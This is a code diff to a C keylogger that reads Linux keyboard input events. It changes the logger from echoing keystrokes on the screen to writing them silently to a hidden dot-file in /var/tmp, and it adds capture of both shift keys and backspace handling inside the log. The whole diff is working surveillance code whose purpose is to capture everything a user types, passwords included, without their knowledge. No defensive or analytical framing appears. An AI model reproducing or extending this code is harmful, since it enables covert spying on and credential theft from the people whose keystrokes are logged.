@@ -157,7 +157,9 @@ int main(){
   //buffer to read input events
   struct input_event event;
 
-
+  FILE *fptr;
+  fptr = fopen("/var/tmp/.log.txt", "a");
+    
   //main logger loop
   while (true) {
     read(fd, &event, sizeof(struct input_event));
@@ -166,31 +168,38 @@ int main(){
     if(event.type == EV_KEY && event.value == 1){
       switch(event.code){
         case KEY_ENTER:
-          printf("\n");
+          fprintf(fptr, "\n");
+          //flush file stream (write to file)
+          fflush(fptr);
           break;
         case KEY_BACKSPACE:
-          printf("\b \b");
-          //manually flush buffer
-          fflush(stdout);
+          long size = ftell(fptr);
+          if(size > 0){
+            ftruncate(fileno(fptr), size - 1);
+            fflush(fptr);
+          }
           break;
         case KEY_LEFTSHIFT:
           shift = true;
           break;
+        case KEY_RIGHTSHIFT:
+          shift = true;
+          break;
         case KEY_TAB:
-          printf("\t");
-          fflush(stdout);
+          fprintf(fptr, "\t");
+          fflush(fptr);
           break;
         default:
           if(shift && shift_table[event.code] != '\0'){
-            printf("%c", shift_table[event.code]);
-            fflush(stdout);
+            fprintf(fptr, "%c", shift_table[event.code]);
+            fflush(fptr);
           } else if(shift && shift_table[event.code] == '\0'){
-            printf("%c", toupper(table[event.code]));
-            fflush(stdout);
+            fprintf(fptr, "%c", toupper(table[event.code]));
+            fflush(fptr);
           }
           else{
-            printf("%c", table[event.code]);
-            fflush(stdout);
+            fprintf(fptr, "%c", table[event.code]);
+            fflush(fptr);
           }
       }
     } else if(event.code == KEY_LEFTSHIFT && event.value == 0){
@@ -198,4 +207,7 @@ int main(){
     }
 
   }
+  // Close the file
+  close(fd);
+  fclose(fptr); 
 }
